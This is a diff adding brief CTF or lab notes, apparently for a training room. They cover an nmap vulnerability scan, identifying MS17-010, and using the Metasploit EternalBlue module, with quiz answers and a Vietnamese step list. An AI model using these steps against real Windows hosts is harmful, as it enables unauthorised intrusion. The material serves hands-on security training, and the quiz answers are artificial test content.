@@ -1,0 +1,28 @@
+task 1 : recon
+
+scan with nmap : nmap -sV -vv --script vuln 10.10.205.187
+-sV : Probe open ports to determine service/version info
+-vV :Increase verbosity level
+How many ports are open with a port number under 1000? 3
+What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067) MS17-010
+
+
+Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)
+
+command search ms + vuln
+exploit/windows/smb/ms17_010_eternalblue
+
+
+
+Show options and set the one required value. What is the name of this value? (All caps for submission)
+ set RHOSTS
+
+các bước exploit : 1 . quét namp để detect lỗi
+2. bật msfconsole
+3. search ms mã lỗi
+4. use payload 
+5. set RHOSTS IP_TARGET
+6. run
+
+
+ 
